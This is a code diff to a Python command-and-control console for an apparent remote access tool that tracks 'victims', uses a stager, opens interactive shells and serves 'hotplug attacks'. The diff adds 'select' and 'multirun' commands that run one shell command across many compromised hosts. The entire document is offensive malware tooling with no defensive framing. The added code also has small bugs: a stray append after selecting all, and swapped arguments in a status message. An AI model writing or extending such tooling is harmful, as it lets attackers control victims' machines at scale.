@@ -16,6 +16,8 @@ newest = None
 hotPlug = False
 hotPlugPort = None
 
+selected = []
+
 def getInfo():
     global stager, newest
     old = 0
@@ -215,9 +217,9 @@ if __name__ == '__main__':
                 continue
             else:
                 first = list(s.vicInfo)[0] # is a uid
-                t = PrettyTable(["uid"] + list(s.vicInfo[first]))
+                t = PrettyTable(["uid"] + list(s.vicInfo[first]) + ["selected"])
                 for uid in s.vicInfo:
-                    t.add_row([uid] + [s.vicInfo[uid][x] for x in s.vicInfo[uid]])
+                    t.add_row([uid] + [s.vicInfo[uid][x] for x in s.vicInfo[uid]] + [True if uid in selected else False])
 
                 print(t)
 
@@ -288,7 +290,9 @@ if __name__ == '__main__':
                 "quit": ["synonymous to exit", "quit"],
                 "wait": ["launches an interactive shell the moment a client connects", "wait"],
                 "hotplug": ["launches an http server for hotplug attacks", "hotplug (port)"],
-                "rm": ["deletes a uid from authorized and from table", "rm (uid)"]
+                "rm": ["deletes a uid from authorized and from table", "rm (uid)"],
+                "select": ["selects a uid for multirun - can also select all with *", "select (uid)"],
+                "multirun": ["runs a command on each uid selected", "multirun (cmd)"]
             }
 
             t = PrettyTable(["command", "description", "usage"])
@@ -313,6 +317,7 @@ if __name__ == '__main__':
             try:
                 s.authorized.remove(uid)
                 s.vicInfo.pop(uid)
+                if uid in selected: selected.remove(uid)
                 print("[+] removed uid \"{}\" from authorized uid list".format(uid))
             except:
                 print("[X] couldn't remove uid \"{}\" - possibly doesn't exist?".format(uid))
@@ -354,6 +359,50 @@ if __name__ == '__main__':
                 srv.stopHotplug()
                 hotPlug = False
                 print("[+] stopped hotplug server")
+
+        elif cmd.lower() == "select":
+            if cArgs == None:
+                print("[+] not enough arguments - view \"help\" to view arguments for this command")
+                continue
+
+            uid = cArgs.split(" ", 1)[0]
+
+            if uid == "*":
+                if selected != s.authorized:
+                    selected = s.authorized
+                    print("[+] moved all authorized uids to selected")
+                else:
+                    selected = []
+                    print("[+] removed all selected uids")
+
+            if uid not in selected:
+                selected.append(uid)
+                print("[+] selected uid \"{}\"".format(uid))
+            else:
+                selected.remove(uid)
+                print("[+] deselected uid \"{}\"".format(uid))
+
+
+        elif cmd.lower() == "multirun":
+            if cArgs == None:
+                print("[+] not enough arguments - view \"help\" to view arguments for this command")
+                continue
+
+            command = cArgs
+
+            if len(selected) == 0:
+                print("[+] no uids selected - use select command to select some")
+                continue
+
+            for x in selected:
+                a = s.client(x)
+                try:
+                    a.run(command)
+                except KeyboardInterrupt:
+                    print("[+] ctrl+c - skipping \"{}\"".format(x))
+                    continue
+
+                print("[+] ran command \"{}\" on uid \"{}\"".format(x, command))
 
         else:
             print("[+] not a valid command - run 'help' for a table of them")
